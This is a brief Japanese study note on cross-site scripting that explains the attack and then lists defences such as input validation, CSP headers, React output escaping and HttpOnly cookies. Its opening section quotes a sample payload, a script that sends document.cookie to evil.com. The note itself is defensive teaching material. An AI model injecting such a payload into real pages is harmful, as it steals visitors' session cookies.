# XSS(Cross-Site Scripting)

## XSSとは？

- 攻撃者が掲示板などのコメント欄に悪意あるスクリプト（例: `<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
`）を投稿する
- 他のユーザーがこのコメントを表示した際に、そのユーザーのブラウザでスクリプトが実行されてしまう
  - Cookieが盗まれてしまう
  - フォームが自動送信される
  - 見た目（HTML）を書き換えてしまう

## 対策

### 埋め込み・登録を防ぐ: 入力値サニタイズ

- フロントエンド・サーバーサイドの双方でユーザー入力値のバリデーションを行う

### 発動を防ぐ1: CSP

- サーバ側でContent-Security-Policy（CSP）を設定する(レスポンスにヘッダをセットする)
  - CSPは、ブラウザに命令をするもの(インラインのJS実行禁止とか、同一オリジンのJSのみ実行許可するとか)
  - ブラウザがCSPに書かれている命令を読み取り、それに則り行動する
- 設定例:
  - `script-src 'self'`: `<script src="./script/app.js></script>`といった 外部スクリプトの同一オリジンのみ許可（インライン＝HTML内のJSやbutton等のHTMLタグのonclick属性等のJSもブロック）

[コンテンツセキュリティポリシー (CSP) - HTTP | MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Guides/CSP)

### 発動を防ぐ2: 出力時のエスケープ

- ReactのJSX内の埋め込みでは、デフォルトでHTMLとして解釈されないようエスケープされる
- ただし`dangerouslySetInnerHTML`のようなエスケープを無効化し、HTMLとして認識させるオプションを使用する際は注意する

### 読み取りを防ぐ: Cookie HttpOnly属性

- Cookie HttpOnly属性をつけることでJSからトークンを盗まれないようにする

### サーバー側での考慮事項

- Content-Typeに正しい値を指定する
  - JSONの値にJavaScriptコードを埋め込み、それを`Content-Type: application/html`として返し、それをユーザーがブラウザで表示してしまうと、そのスクリプトは実行されてしまう

### 対策まとめ

サーバーからブラウザに変なJSを実行しないでね＋ユーザー入力値はきちんと文字列として扱ってね＋もし万が一Cookieにアクセスされても盗まれないように